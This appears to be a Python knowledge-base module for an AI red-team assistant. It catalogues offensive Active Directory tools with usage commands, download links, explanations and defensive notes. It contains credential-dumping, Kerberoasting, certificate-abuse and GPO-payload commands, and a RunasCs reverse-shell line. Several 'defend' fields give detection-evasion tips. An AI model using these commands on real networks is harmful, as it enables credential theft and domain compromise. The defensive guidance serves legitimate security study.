"""
ERR0RS Ultimate — grejh0t/precompiled-binaries Knowledge Base Module
=====================================================================
Indexes the precompiled-binaries repo for RAG-powered AI queries.
Covers pre-compiled .NET offensive tooling for Windows AD environments:
  Enumeration, Lateral Movement, Credential Gathering,
  Privilege Escalation, GPO Abuse, Certificate Abuse, Azure AD Abuse,
  and PowerShell scripts (PowerView, PowerUp, Inveigh, etc.)

Source: https://github.com/grejh0t/precompiled-binaries
        (fork of jakobfriedl/precompiled-binaries)

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

from __future__ import annotations
import logging
from pathlib import Path

log = logging.getLogger("errors.ai.precompiled_bins_kb")

ROOT_DIR = Path(__file__).resolve().parents[2]
REPO_PATH = ROOT_DIR / "knowledge" / "windows" / "precompiled-binaries"
REPO_URL  = "https://github.com/grejh0t/precompiled-binaries"

# ── Tool catalogue — every binary in the repo with full metadata ──────────────
PRECOMPILED_TOOLS = {

    # ── ENUMERATION ───────────────────────────────────────────────────────────
    "SharpHound": {
        "category":    "Enumeration",
        "description": "BloodHound data collector. Enumerates AD objects, ACLs, sessions, and "
                       "group memberships to build the attack path graph.",
        "use_case":    "Run as first step after foothold. Outputs JSON files ingested by "
                       "BloodHound GUI to visualise the shortest path to Domain Admin.",
        "usage":       "SharpHound.exe --CollectionMethods All --OutputDirectory C:\\temp",
        "teach":       "SharpHound queries LDAP/Active Directory for every user, computer, "
                       "group, ACL, and session. BloodHound then visualises attack paths — "
                       "'Who has GenericAll on this group? Who is in that group? Which machine "
                       "does that user have admin on?' This turns a complex AD into a graph "
                       "problem with a clear shortest-path solution.",
        "defend":      "SharpHound generates heavy LDAP traffic (Event 1644) and many "
                       "net session enumeration calls (Event 4624 type 3). Monitor for "
                       "bulk LDAP queries in short windows. Deploy BloodHound defensively "
                       "(BlueHound / PlumHound) to find and fix your own attack paths first.",
        "mitre":       ["T1069 - Permission Groups Discovery",
                        "T1087 - Account Discovery",
                        "T1482 - Domain Trust Discovery"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/SharpHound/SharpHound.exe",
    },
    "Seatbelt": {
        "category":    "Enumeration",
        "description": "GhostPack host enumeration tool. Collects security-relevant information "
                       "from a Windows host — credentials, misconfigs, network info, browser data.",
        "use_case":    "Run post-exploitation to quickly assess the host for pivot opportunities "
                       "and privilege escalation vectors.",
        "usage":       "Seatbelt.exe -group=all",
        "teach":       "Seatbelt runs 70+ checks: saved credentials, scheduled tasks, "
                       "installed software, AV/EDR products, PowerShell history, Putty sessions, "
                       "RDP saved connections, Chrome/Firefox credentials, DPAPI blobs, "
                       "and Windows Vault entries. It's the fastest way to understand "
                       "a compromised host's treasure trove.",
        "defend":      "Seatbelt execution shows as .NET assembly load in Event 4688. "
                       "EDRs detect it on behavioral signature (mass WMI + registry reads). "
                       "AMSI catches it when run via PowerShell. Run from disk triggers "
                       "AV — use reflective loading.",
        "mitre":       ["T1082 - System Information Discovery",
                        "T1083 - File and Directory Discovery",
                        "T1552 - Unsecured Credentials"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/Seatbelt.exe",
    },
    "SharpUp": {
        "category":    "Enumeration",
        "description": "GhostPack privilege escalation checks. Identifies common Windows "
                       "privesc vectors: unquoted service paths, weak service permissions, "
                       "AlwaysInstallElevated, etc.",
        "use_case":    "Run immediately after gaining a low-privilege shell to find "
                       "local privilege escalation opportunities.",
        "usage":       "SharpUp.exe audit",
        "teach":       "SharpUp is the .NET equivalent of PowerUp.ps1. Checks: unquoted "
                       "service paths (any space without quotes = hijackable), modifiable "
                       "service binaries, AlwaysInstallElevated registry keys, "
                       "modifiable scheduled tasks, and DLL hijacking opportunities. "
                       "Each finding tells you exactly which path to abuse.",
        "defend":      "Fix unquoted service paths (wrap in quotes in registry). "
                       "Audit service binary permissions — only SYSTEM/Admins should write. "
                       "Disable AlwaysInstallElevated via GPO. Monitor for service binary "
                       "replacement (file write to Program Files paths by non-admin).",
        "mitre":       ["T1574.009 - Path Interception by Unquoted Path",
                        "T1574.010 - Services File Permissions Weakness"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/SharpUp.exe",
    },
    "winPEAS": {
        "category":    "Enumeration",
        "description": "Windows Privilege Escalation Awesome Script. The most comprehensive "
                       "Windows host enumeration tool — checks hundreds of vectors.",
        "use_case":    "Full host audit post-exploitation. Outputs color-coded results "
                       "highlighting the most dangerous findings in red.",
        "usage":       "winPEAS.exe",
        "teach":       "winPEAS checks everything: credentials in registry/files/browser, "
                       "service misconfigs, scheduled tasks, AlwaysInstallElevated, "
                       "LSA protection status, DPAPI blobs, network config, installed software, "
                       "AV/EDR products, and potential DLL hijack paths. "
                       "Red output = high confidence privesc vector. Always check the summary "
                       "section at the bottom first.",
        "defend":      "winPEAS execution is extremely loud — hundreds of WMI queries, "
                       "registry reads, and file system traversals in seconds. "
                       "EDR behavioral detection fires reliably. AMSI blocks it via PowerShell.",
        "mitre":       ["T1082 - System Information Discovery",
                        "T1552 - Unsecured Credentials",
                        "T1518 - Software Discovery"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/winPEAS.exe",
    },
    "SharpView": {
        "category":    "Enumeration",
        "description": "C# port of PowerView.ps1. AD enumeration without PowerShell — "
                       "evades PowerShell logging and AMSI while performing the same queries.",
        "use_case":    "AD enumeration from a .NET context. Use when PowerShell is "
                       "restricted or heavily monitored.",
        "usage":       "SharpView.exe Get-DomainUser -SPN",
        "teach":       "SharpView exposes all the PowerView functions — Get-DomainUser, "
                       "Get-DomainGroup, Get-ObjectAcl, Find-LocalAdminAccess, etc. "
                       "The advantage over PowerView: runs as a .NET executable, bypassing "
                       "PowerShell Script Block Logging (Event 4104) and AMSI. "
                       "Use Get-ObjectAcl -ResolveGUIDs to find dangerous ACLs like "
                       "GenericAll, WriteDACL, WriteOwner — these are your privilege "
                       "escalation paths in AD.",
        "defend":      "SharpView still generates LDAP traffic (Event 1644) and "
                       "net logon events. Monitor for unusual LDAP search patterns. "
                       "Enable Advanced Audit Policy: DS Access → Audit Directory Service Access.",
        "mitre":       ["T1069 - Permission Groups Discovery",
                        "T1087 - Account Discovery",
                        "T1222 - File and Directory Permissions Modification"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/SharpView.exe",
    },
    "NoPowerShell": {
        "category":    "Enumeration",
        "description": "Execute PowerShell cmdlets from a .NET binary without invoking "
                       "powershell.exe — bypasses PowerShell logging and restrictions.",
        "use_case":    "Run PowerShell commands when PowerShell is blocked or constrained "
                       "language mode prevents full execution.",
        "usage":       "NoPowerShell.exe Get-ADUser -Filter *",
        "teach":       "NoPowerShell reimplements common PowerShell cmdlets in C# and "
                       "executes them via the .NET runtime, bypassing: Script Block Logging "
                       "(Event 4104), Constrained Language Mode, PowerShell AMSI, "
                       "and AppLocker PowerShell rules. The process appears as a .NET binary, "
                       "not powershell.exe — evading process-name based detections.",
        "defend":      "Monitor for .NET processes making LDAP/AD API calls that aren't "
                       "domain-joined tools. Constrained Language Mode alone is insufficient "
                       "— combine with application whitelisting and EDR behavioral detection.",
        "mitre":       ["T1059.001 - PowerShell", "T1562 - Impair Defenses"],
        "download":    f"{REPO_URL}/raw/main/Enumeration/NoPowerShell.exe",
    },

    # ── LATERAL MOVEMENT ──────────────────────────────────────────────────────
    "Rubeus": {
        "category":    "LateralMovement",
        "description": "GhostPack Kerberos attack toolkit. The definitive tool for "
                       "Kerberos abuse: AS-REP Roasting, Kerberoasting, Pass-the-Ticket, "
                       "Golden Ticket, Silver Ticket, Overpass-the-Hash, S4U2self/S4U2proxy.",
        "use_case":    "Kerberos-based lateral movement and privilege escalation. "
                       "Core tool for every Windows AD engagement.",
        "usage":       "Rubeus.exe kerberoast /outfile:hashes.txt\n"
                       "Rubeus.exe asreproast /format:hashcat\n"
                       "Rubeus.exe ptt /ticket:base64ticket",
        "teach":       "Kerberoasting: any domain user can request a TGS for any SPN. "
                       "The TGS is encrypted with the service account's password hash. "
                       "Offline crack with hashcat -m 13100. "
                       "AS-REP Roasting: accounts with 'Do not require Kerberos preauthentication' "
                       "expose their hash without credentials. "
                       "Pass-the-Ticket: steal a Kerberos TGT from memory and import it — "
                       "you are now that user for the ticket's lifetime. "
                       "Golden Ticket: forge a TGT using the KRBTGT hash — persistent "
                       "domain-level access that survives password resets.",
        "defend":      "Kerberoasting: use Managed Service Accounts (MSA/gMSA) with "
                       "randomly generated 120-char passwords. Enable AES256 for service accounts. "
                       "Monitor Event 4769 (TGS requests) for unusual service ticket requests. "
                       "AS-REP Roasting: require preauthentication on all accounts (default). "
                       "Golden Ticket: reset KRBTGT password twice to invalidate all forged tickets. "
                       "Deploy Microsoft Defender for Identity for Kerberos attack detection.",
        "mitre":       ["T1558.003 - Kerberoasting",
                        "T1558.004 - AS-REP Roasting",
                        "T1550.003 - Pass the Ticket",
                        "T1558.001 - Golden Ticket"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/Rubeus.exe",
    },
    "Whisker": {
        "category":    "LateralMovement",
        "description": "Shadow Credentials attack tool. Adds a fake certificate to a "
                       "target AD account's msDS-KeyCredentialLink attribute to enable "
                       "certificate-based authentication as that account.",
        "use_case":    "Stealthy persistence and lateral movement when you have write "
                       "access to a target account's attributes.",
        "usage":       "Whisker.exe add /target:targetuser",
        "teach":       "Shadow Credentials abuse Windows Hello for Business (WHfB) PKI. "
                       "If you have write access to msDS-KeyCredentialLink on an account, "
                       "Whisker adds a fake certificate credential. You then use that certificate "
                       "with Rubeus (Rubeus.exe asktgt /user:target /certificate:...) to get "
                       "a TGT as the target user — without knowing their password. "
                       "Works on Domain Controllers and computer accounts too.",
        "defend":      "Monitor for modifications to msDS-KeyCredentialLink (Event 5136). "
                       "Alert on unexpected certificate additions. "
                       "Audit who has write access to AD objects — limit GenericWrite/GenericAll.",
        "mitre":       ["T1098 - Account Manipulation",
                        "T1556 - Modify Authentication Process"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/Whisker.exe",
    },
    "Certify": {
        "category":    "LateralMovement",
        "description": "GhostPack AD Certificate Services (ADCS) exploitation tool. "
                       "Enumerates vulnerable certificate templates and requests rogue certificates "
                       "for privilege escalation (ESC1-ESC8).",
        "use_case":    "ADCS exploitation — the most underrated privilege escalation path "
                       "in Active Directory. Present in most enterprise environments.",
        "usage":       "Certify.exe find /vulnerable\n"
                       "Certify.exe request /ca:CA-SERVER\\CA-NAME /template:VulnTemplate "
                       "/altname:Administrator",
        "teach":       "ADCS ESC1: a certificate template allows the requester to specify "
                       "a Subject Alternative Name (SAN) AND allows client authentication. "
                       "You request a cert with SAN=Administrator and use it to authenticate "
                       "as Domain Admin. The cert is valid for years — bypasses password resets. "
                       "Certify.exe find /vulnerable shows all ESC1-8 misconfigurations. "
                       "ESC8: HTTP NTLM relay to ADCS web enrollment — coerce auth + relay "
                       "= Domain Admin cert in one shot.",
        "defend":      "Audit certificate templates — remove SAN/enrollee-supplied subject "
                       "where not required. Enable 'CA Certificate Manager Approval' for "
                       "sensitive templates. Monitor Event 4886/4887 (certificate requests). "
                       "Use PSPKIAudit or Locksmith to find misconfigurations proactively.",
        "mitre":       ["T1649 - Steal or Forge Authentication Certificates",
                        "T1550 - Use Alternate Authentication Material"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/CertificateAbuse/Certify.exe",
    },
    "RunasCS": {
        "category":    "LateralMovement",
        "description": "C# implementation of runas with credential specification. "
                       "Run commands as another user with plaintext credentials.",
        "use_case":    "Execute commands or spawn processes as a different user when "
                       "you have their plaintext password but not an interactive session.",
        "usage":       "RunasCs.exe username password cmd.exe -r 10.10.10.100:4444",
        "teach":       "RunasCS wraps the CreateProcessWithLogonW Windows API to start "
                       "a process with alternate credentials. Unlike runas.exe, it accepts "
                       "the password on the command line (no interactive prompt) and supports "
                       "reverse shells. Works across network logons and can bypass UAC in "
                       "certain configurations. Key for credential spraying → execution.",
        "defend":      "Windows Event 4648 (logon with explicit credentials) fires on every "
                       "RunasCS execution. Monitor for command-line processes specifying "
                       "plaintext credentials. Network logon events from unexpected sources.",
        "mitre":       ["T1078 - Valid Accounts",
                        "T1021 - Remote Services"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/RunasCs.exe",
    },
    "SharpGPOAbuse": {
        "category":    "LateralMovement",
        "description": "FSecureLABS GPO exploitation tool. Modifies Group Policy Objects "
                       "to add scheduled tasks, services, or registry keys for code execution "
                       "on target machines.",
        "use_case":    "When you have write access to a GPO, use it to push malicious "
                       "configurations to all machines the GPO applies to.",
        "usage":       "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' "
                       "--Author DOMAIN\\Administrator --Command cmd.exe "
                       "--Arguments '/c powershell.exe -enc ...' --GPOName 'Default Domain Policy'",
        "teach":       "If you can modify a GPO (GenericWrite/GenericAll on the GPO object), "
                       "you can push any configuration to every machine in the GPO scope. "
                       "Adding a scheduled task or startup script means every computer in the "
                       "OU runs your payload on next Group Policy refresh (default 90 minutes). "
                       "This is domain-wide lateral movement from a single GPO write permission.",
        "defend":      "Audit GPO modify permissions — only Domain Admins should write GPOs. "
                       "Monitor Event 5136 (GPO modification) and 4739 (Domain Policy changed). "
                       "Enable GPO change monitoring via AGPM or ADAudit Plus.",
        "mitre":       ["T1484.001 - Domain Policy Modification: Group Policy Modification",
                        "T1053.005 - Scheduled Task/Job"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/GPOAbuse/SharpGPOAbuse.exe",
    },
    "SharpSCCM": {
        "category":    "LateralMovement",
        "description": "Interaction with Microsoft SCCM/MECM for lateral movement and "
                       "credential extraction. Exploit SCCM's administrative capabilities "
                       "for code execution on managed endpoints.",
        "use_case":    "When SCCM is deployed (most enterprise environments), abuse "
                       "SCCM admin access for lateral movement to any managed endpoint.",
        "usage":       "SharpSCCM.exe get site-info\n"
                       "SharpSCCM.exe exec -sms SCCM-SERVER -sc SITE-CODE "
                       "-d TARGET-COMPUTER -r cmd.exe /c whoami",
        "teach":       "SCCM Full Administrators can push scripts and packages to any "
                       "managed machine in the environment. If you compromise a SCCM admin "
                       "account or the SCCM server itself, you have code execution on every "
                       "managed endpoint. SCCM also stores network access account (NAA) "
                       "credentials in the WMI repository — often a privileged account "
                       "that can be extracted for lateral movement.",
        "defend":      "Apply SCCM role-based access control — limit Full Administrator. "
                       "Enable HTTPS-only for SCCM communication. "
                       "Protect NAA credentials — use gMSA instead. "
                       "Monitor SCCM deployment logs for unexpected script deployments.",
        "mitre":       ["T1072 - Software Deployment Tools",
                        "T1078 - Valid Accounts"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/SharpSCCM.exe",
    },
    "ADSyncDecrypt": {
        "category":    "LateralMovement",
        "description": "Extract and decrypt Azure AD Connect sync account credentials "
                       "from the local database. Gives access to the Azure AD sync account "
                       "which often has privileged cloud access.",
        "use_case":    "On the Azure AD Connect server, extract the sync credentials "
                       "to gain access to Azure AD with the on-prem sync account.",
        "usage":       "ADSyncDecrypt.exe (run on Azure AD Connect server as admin)",
        "teach":       "Azure AD Connect stores the MSOL sync account credentials encrypted "
                       "in the local SQL database. With admin access on the AAD Connect server, "
                       "you can decrypt these credentials. The sync account has broad "
                       "Azure AD read permissions and sometimes write permissions depending "
                       "on the sync configuration. This bridges on-prem compromise to cloud.",
        "defend":      "Protect the Azure AD Connect server as a Tier 0 asset — "
                       "treat it like a Domain Controller. "
                       "Monitor for process execution on the AAD Connect server. "
                       "Use minimal permissions for the sync account. "
                       "Enable Entra ID PIM for the sync account.",
        "mitre":       ["T1555 - Credentials from Password Stores",
                        "T1098 - Account Manipulation"],
        "download":    f"{REPO_URL}/raw/main/LateralMovement/AzureAD/ADSyncDecrypt.exe",
    },

    # ── CREDENTIAL GATHERING ──────────────────────────────────────────────────
    "mimikatz": {
        "category":    "Credentials",
        "description": "The definitive Windows credential extraction tool. Dumps "
                       "plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI keys "
                       "from LSASS memory and the Windows SAM database.",
        "use_case":    "Post-exploitation credential harvesting. The first tool run "
                       "after achieving SYSTEM or Debug privilege on a Windows host.",
        "usage":       "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n"
                       "mimikatz.exe \"lsadump::sam\" exit\n"
                       "mimikatz.exe \"lsadump::dcsync /user:krbtgt\" exit",
        "teach":       "Mimikatz reads the LSASS process memory where Windows caches "
                       "credentials for SSO. sekurlsa::logonpasswords dumps all cached "
                       "credentials including plaintext (if WDigest enabled) and NTLM hashes. "
                       "lsadump::sam extracts local account hashes. "
                       "lsadump::dcsync replicates from a DC as if you are another DC — "
                       "dumps any account's hash including krbtgt for Golden Ticket. "
                       "The krbtgt hash is the crown jewel of AD compromise.",
        "defend":      "Enable Credential Guard (virtualisation-based security for LSASS). "
                       "Enable LSA Protection (Protected Process Light for LSASS). "
                       "Disable WDigest authentication (registry: UseLogonCredential=0). "
                       "EDR detects mimikatz via LSASS memory access (Event 10) + "
                       "known module signatures. Deploy Microsoft Defender for Identity "
                       "for DCSync attack detection (Event 4662).",
        "mitre":       ["T1003.001 - LSASS Memory",
                        "T1003.002 - Security Account Manager",
                        "T1003.006 - DCSync"],
        "download":    f"{REPO_URL}/raw/main/Credentials/mimikatz.exe",
    },
    "SharpDPAPI": {
        "category":    "Credentials",
        "description": "GhostPack DPAPI decryption tool. Decrypts DPAPI-protected secrets "
                       "including browser credentials, RDP passwords, credential manager "
                       "entries, and WiFi passwords using domain backup keys or user masterkeys.",
        "use_case":    "Decrypt credentials stored by Windows applications without "
                       "needing to touch LSASS — stealthier than mimikatz on modern EDRs.",
        "usage":       "SharpDPAPI.exe machinecredentials\n"
                       "SharpDPAPI.exe credentials /target:GUID",
        "teach":       "DPAPI (Data Protection API) is Windows' built-in secret storage. "
                       "Every browser, Windows Credential Manager, and WiFi password uses it. "
                       "User DPAPI data is encrypted with the user's password-derived key. "
                       "Machine DPAPI data is encrypted with the machine's key. "
                       "With domain admin access you can retrieve the domain DPAPI backup key "
                       "and decrypt ALL domain users' DPAPI secrets offline — "
                       "credentials from every browser on every machine.",
        "defend":      "Enable Credential Guard (protects DPAPI machine key). "
                       "Monitor for DPAPI backup key retrieval (Event 4662 with GUID "
                       "B2873DF1-B2EF-11d1-8C21-00C04F9F742A). "
                       "Monitor for SharpDPAPI execution (behavioral + hash). "
                       "Regularly rotate privileged account passwords.",
        "mitre":       ["T1555 - Credentials from Password Stores",
                        "T1552.002 - Credentials in Registry"],
        "download":    f"{REPO_URL}/raw/main/Credentials/SharpDPAPI.exe",
    },
    "SharpChrome": {
        "category":    "Credentials",
        "description": "GhostPack Chrome credential extractor. Decrypts saved Chrome "
                       "passwords, cookies, and history using DPAPI.",
        "use_case":    "Extract all Chrome-saved passwords from a compromised host "
                       "without triggering LSASS-based detections.",
        "usage":       "SharpChrome.exe logins\nSharpChrome.exe cookies",
        "teach":       "Chrome stores credentials encrypted with DPAPI (pre-Chrome 80) "
                       "or AES-256-GCM with the key itself DPAPI-encrypted (Chrome 80+). "
                       "SharpChrome handles both schemes and outputs plaintext credentials. "
                       "This is often the fastest path to cloud service credentials — "
                       "users save AWS console, Azure portal, GitHub, and email passwords "
                       "in Chrome. Cookies can be imported to hijack active sessions "
                       "without knowing the password.",
        "defend":      "Enable Chrome's 'Password Manager' sync with MFA — "
                       "even extracted passwords require MFA to use. "
                       "Enforce hardware security keys for critical services. "
                       "Monitor for access to Chrome's Login Data SQLite file "
                       "(%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data).",
        "mitre":       ["T1555.003 - Credentials from Web Browsers",
                        "T1539 - Steal Web Session Cookie"],
        "download":    f"{REPO_URL}/raw/main/Credentials/SharpChrome.exe",
    },
    "GMSAPasswordReader": {
        "category":    "Credentials",
        "description": "Read Group Managed Service Account (gMSA) passwords. If you have "
                       "read permissions on the msDS-ManagedPassword attribute, extract "
                       "the current and previous password of the gMSA account.",
        "use_case":    "Escalate from a machine account or service context that has "
                       "ReadGMSAPassword rights to gain the gMSA credential.",
        "usage":       "GMSAPasswordReader.exe --AccountName svc-gmsa",
        "teach":       "gMSA accounts are designed to have automatically rotating passwords "
                       "that no human knows. However, certain AD accounts can be granted "
                       "ReadGMSAPassword permissions. If you compromise an account with "
                       "this right, you can read the current gMSA password and authenticate "
                       "as the gMSA — which often has high privileges (service accounts "
                       "are frequently over-privileged). The password changes on rotation "
                       "schedule but you can re-read it anytime you have the permission.",
        "defend":      "Audit who has ReadGMSAPassword on each gMSA. "
                       "Follow least-privilege — only the services that need the gMSA "
                       "should have read rights. Monitor for gMSA password reads from "
                       "unexpected accounts (Event 4624 type 5 from unusual sources).",
        "mitre":       ["T1552 - Unsecured Credentials",
                        "T1078 - Valid Accounts"],
        "download":    f"{REPO_URL}/raw/main/Credentials/GMSAPasswordReader.exe",
    },
    "SharpLAPS": {
        "category":    "Credentials",
        "description": "Reads LAPS (Local Administrator Password Solution) passwords from "
                       "Active Directory for computers where you have read access to the "
                       "ms-Mcs-AdmPwd attribute.",
        "use_case":    "When LAPS is deployed, read local admin passwords for machines "
                       "where your current account has LAPS read permissions.",
        "usage":       "SharpLAPS.exe /host:TARGET-COMPUTER",
        "teach":       "LAPS stores randomised local administrator passwords in AD "
                       "on the ms-Mcs-AdmPwd attribute. By default only domain admins "
                       "and specific delegated accounts can read it. But misconfigurations "
                       "are common — a whole OU might have read access to LAPS passwords. "
                       "If you compromise any account with read rights, SharpLAPS dumps "
                       "every local admin password for every LAPS-managed machine in scope. "
                       "This gives you lateral movement to those machines instantly.",
        "defend":      "Audit LAPS read permissions with LAPSToolkit — only specific "
                       "helpdesk/admin accounts should have read access, scoped to their OU. "
                       "Monitor for bulk ms-Mcs-AdmPwd reads (Event 1644 filtering on that attribute). "
                       "Upgrade to Windows LAPS (built into Windows 11/Server 2022) which "
                       "has better access control and auditing.",
        "mitre":       ["T1552 - Unsecured Credentials",
                        "T1078.002 - Domain Accounts"],
        "download":    f"{REPO_URL}/raw/main/Credentials/SharpLAPS.exe",
    },

    # ── PRIVILEGE ESCALATION ──────────────────────────────────────────────────
    "GodPotato": {
        "category":    "PrivilegeEscalation",
        "description": "Token impersonation exploit for SeImpersonatePrivilege. "
                       "The most universal Potato — works on Windows Server 2012 through 2022 "
                       "and Windows 10/11.",
        "use_case":    "Escalate from service account/IIS/SQL Server context with "
                       "SeImpersonatePrivilege to SYSTEM.",
        "usage":       "GodPotato.exe -cmd \"cmd /c whoami\"",
        "teach":       "SeImpersonatePrivilege is granted to: IIS application pools, "
                       "SQL Server service accounts, network service accounts. "
                       "The Potato family exploits Windows' COM infrastructure to coerce "
                       "a SYSTEM-level process to authenticate to an attacker-controlled "
                       "named pipe, then impersonate that token. GodPotato uses RPC calls "
                       "to trigger DCOM authentication. This is the standard path: "
                       "web shell → service account → SeImpersonatePrivilege → GodPotato → SYSTEM.",
        "defend":      "Remove SeImpersonatePrivilege from service accounts where possible. "
                       "Run IIS/SQL in minimal-privilege containers. "
                       "Monitor for named pipe creation by service accounts + "
                       "subsequent SYSTEM token usage. "
                       "Windows Server 2022 with all updates patches most Potato vectors.",
        "mitre":       ["T1134.002 - Token Impersonation/Theft",
                        "T1548 - Abuse Elevation Control Mechanism"],
        "download":    f"{REPO_URL}/raw/main/PrivilegeEscalation/Token/GodPotato.exe",
    },
    "KrbRelayUp": {
        "category":    "PrivilegeEscalation",
        "description": "Universal local privilege escalation in AD domains where LDAP "
                       "signing is not enforced. Relays Kerberos authentication from "
                       "DCOM to LDAP to add a machine account and gain SYSTEM.",
        "use_case":    "Any domain-joined machine without LDAP signing enforcement. "
                       "Escalate from any low-privilege domain user to SYSTEM.",
        "usage":       "KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount "
                       "-ComputerName ERRZ$ -ComputerPassword Password123!",
        "teach":       "KrbRelayUp chains multiple techniques: "
                       "1) Creates a fake DCOM server that captures Kerberos authentication. "
                       "2) Relays the Kerberos AP-REQ to LDAP to add a machine account. "
                       "3) Configures Resource-Based Constrained Delegation (RBCD) from "
                       "the new machine account to the victim machine. "
                       "4) Uses S4U2self/S4U2proxy to impersonate Administrator on the machine. "
                       "5) Creates a service ticket → PSExec → SYSTEM. "
                       "Works without any existing privileges — any domain user.",
        "defend":      "Enable LDAP signing and LDAP channel binding (critical — "
                       "this single control blocks KrbRelayUp). "
                       "Set ms-DS-MachineAccountQuota to 0 (prevents regular users "
                       "from adding machine accounts). "
                       "Monitor for new computer accounts created by non-admin users.",
        "mitre":       ["T1558 - Steal or Forge Kerberos Tickets",
                        "T1134 - Access Token Manipulation",
                        "T1548 - Abuse Elevation Control Mechanism"],
        "download":    f"{REPO_URL}/raw/main/PrivilegeEscalation/KrbRelayUp.exe",
    },

    # ── POWERSHELL SCRIPTS ────────────────────────────────────────────────────
    "PowerView": {
        "category":    "Scripts",
        "description": "The definitive PowerShell AD enumeration framework. "
                       "Hundreds of functions for complete Active Directory reconnaissance.",
        "use_case":    "AD enumeration, ACL analysis, trust mapping, and identifying "
                       "attack paths. The foundation of every AD engagement.",
        "usage":       "Import-Module PowerView.ps1\n"
                       "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname\n"
                       "Find-LocalAdminAccess\n"
                       "Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}",
        "teach":       "PowerView's most valuable functions: "
                       "Get-DomainUser -SPN (find Kerberoastable accounts), "
                       "Find-LocalAdminAccess (find machines where current user is local admin), "
                       "Get-ObjectAcl -ResolveGUIDs (find abusable ACLs), "
                       "Get-DomainTrust (map trust relationships), "
                       "Get-NetGPO (enumerate Group Policy). "
                       "Used to answer: 'Where can I go from here?' at every step of an engagement.",
        "defend":      "PowerView generates heavy LDAP traffic and net session enumeration. "
                       "Event 4104 (Script Block Logging) captures all PowerView execution. "
                       "AMSI blocks known PowerView signatures. "
                       "Use SharpView (the C# port) to bypass PowerShell logging. "
                       "Enable Advanced Audit on DS Access.",
        "mitre":       ["T1087 - Account Discovery",
                        "T1069 - Permission Groups Discovery",
                        "T1482 - Domain Trust Discovery"],
        "download":    f"{REPO_URL}/raw/main/Scripts/PowerView.ps1",
    },
    "Inveigh": {
        "category":    "Scripts",
        "description": "PowerShell MitM tool for LLMNR/NBT-NS/mDNS/DNS spoofing and "
                       "NTLM relay attacks — the PowerShell equivalent of Responder.",
        "use_case":    "Capture and relay NTLM hashes on internal networks without "
                       "requiring Kali Linux or a separate attacker machine.",
        "usage":       "Invoke-Inveigh -ConsoleOutput Y -FileOutput Y",
        "teach":       "When a Windows machine can't resolve a hostname via DNS, it "
                       "falls back to LLMNR/NBT-NS broadcasts asking 'does anyone know X?' "
                       "Inveigh responds to these broadcasts pretending to be that host, "
                       "capturing the victim's NTLM authentication attempt. "
                       "NTLMv2 hashes can be cracked offline (hashcat -m 5600) or "
                       "relayed via ntlmrelayx to other machines for direct shell access. "
                       "Inveigh captures these from within PowerShell — no Linux box needed.",
        "defend":      "Disable LLMNR via Group Policy (Computer Config → Admin Templates "
                       "→ Network → DNS Client → Turn off multicast name resolution). "
                       "Disable NetBIOS over TCP/IP on all adapters. "
                       "Enable SMB signing (blocks relay attacks). "
                       "Monitor for Event 4624 type 3 logons from unexpected sources.",
        "mitre":       ["T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
                        "T1040 - Network Sniffing"],
        "download":    f"{REPO_URL}/raw/main/Scripts/Inveigh.ps1",
    },
    "PowerUp": {
        "category":    "Scripts",
        "description": "PowerShell privilege escalation checks. Finds common Windows "
                       "privilege escalation vectors and provides one-liner exploits for each.",
        "use_case":    "Immediate local privilege escalation assessment after gaining "
                       "a low-privilege shell on a Windows host.",
        "usage":       "Import-Module PowerUp.ps1\nInvoke-AllChecks",
        "teach":       "PowerUp's Invoke-AllChecks scans for: unquoted service paths, "
                       "modifiable service binaries, modifiable service registry keys, "
                       "AlwaysInstallElevated, modifiable scheduled tasks, DLL hijacking "
                       "opportunities, and token privilege abuse. "
                       "Each finding comes with an Invoke-ServiceAbuse or similar one-liner "
                       "that exploits the vulnerability automatically. "
                       "On unpatched/misconfigured machines this provides SYSTEM in under a minute.",
        "defend":      "Same as SharpUp — fix unquoted paths, audit service permissions, "
                       "disable AlwaysInstallElevated. "
                       "Script Block Logging (Event 4104) captures PowerUp execution. "
                       "AMSI detects known PowerUp signatures.",
        "mitre":       ["T1574.009 - Path Interception",
                        "T1548.002 - Bypass UAC"],
        "download":    f"{REPO_URL}/raw/main/Scripts/PowerUp.ps1",
    },
    "LAPSToolkit": {
        "category":    "Scripts",
        "description": "PowerShell tool for auditing and abusing LAPS deployments. "
                       "Finds machines with LAPS enabled, who can read passwords, "
                       "and reads LAPS passwords when permitted.",
        "use_case":    "LAPS audit (defensive) and LAPS password extraction (offensive).",
        "usage":       "Import-Module LAPSToolkit.ps1\n"
                       "Find-LAPSDelegatedGroups\n"
                       "Get-LAPSComputers\n"
                       "Find-AdmPwdExtendedRights",
        "teach":       "LAPSToolkit's key functions: "
                       "Find-AdmPwdExtendedRights — finds every AD group/user with "
                       "AllExtendedRights (can read LAPS passwords). "
                       "Get-LAPSComputers — lists all LAPS-managed machines and when "
                       "their passwords expire. "
                       "On a red team: if any compromised account is in a group with "
                       "LAPS read rights, use Get-AdmPwdPassword to read local admin "
                       "passwords and pivot immediately.",
        "defend":      "Audit with Find-AdmPwdExtendedRights regularly. "
                       "Scope LAPS read to only the accounts that need it. "
                       "Upgrade to Windows LAPS for better security and auditing. "
                       "Monitor bulk LAPS attribute reads.",
        "mitre":       ["T1552 - Unsecured Credentials",
                        "T1087 - Account Discovery"],
        "download":    f"{REPO_URL}/raw/main/Scripts/LAPSToolkit.ps1",
    },
}

# ── Trigger phrases that route to this KB ─────────────────────────────────────
